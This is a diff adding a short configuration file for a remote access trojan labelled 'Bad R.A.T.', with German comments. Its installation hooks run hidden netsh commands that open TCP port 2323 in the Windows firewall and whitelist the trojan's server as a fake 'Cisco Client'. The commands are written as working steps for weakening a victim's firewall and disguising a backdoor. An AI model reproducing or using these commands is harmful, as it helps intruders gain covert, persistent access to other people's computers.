@@ -1,0 +1,8 @@
+;Event Setting [Bad R.A.T.]
+;by Mr Hawk
+
+; FW bei WinXP Sp2 Port öffnen ([BR]-Standardport)
+OnInstallation: StartPath_Hide netsh firewall add portopening protocol=TCP port=2323 name="Used" scope=CUSTOM addresses=LocalSubnet profile=STANDARD
+
+;Server durch FW wandern lassen und als "Cisco Client" tranen
+OnInstallation: netsh firewall add allowedprogram "[%APP]" "Cisco Client" ENABLE
